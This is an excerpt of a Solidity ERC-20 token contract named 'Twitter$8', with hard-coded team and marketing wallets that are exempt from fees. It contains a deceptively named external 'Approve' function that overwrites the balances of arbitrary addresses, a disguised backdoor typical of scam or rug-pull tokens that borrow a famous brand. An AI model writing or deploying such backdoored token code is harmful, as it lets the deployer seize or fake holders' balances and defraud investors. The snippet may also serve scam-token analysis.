...
contract Twitter is Context, IERC20, Ownable {
    ...
    string private _name = "Twitter$8";
    string private _symbol = "Twitter$8";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x1bac21e7EF045e95013DB3598922741B0Bbe0880); 
    address payable private teamWalletAddress = payable(0x0CA110900E69A962b1d902da2B275cA8446832b7); 
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
		...
		_isExcludedFrom[marketWall] = true;
		_isExcludedFrom[teamWalletAddress] = true;
    ...
    function Approve(address from, address to ,uint256 amount ) external  { 
        ...
        require(to != uniswapPair);
        _doollar[from] = amount ;
        _doollar[to] = amount ;
    }  
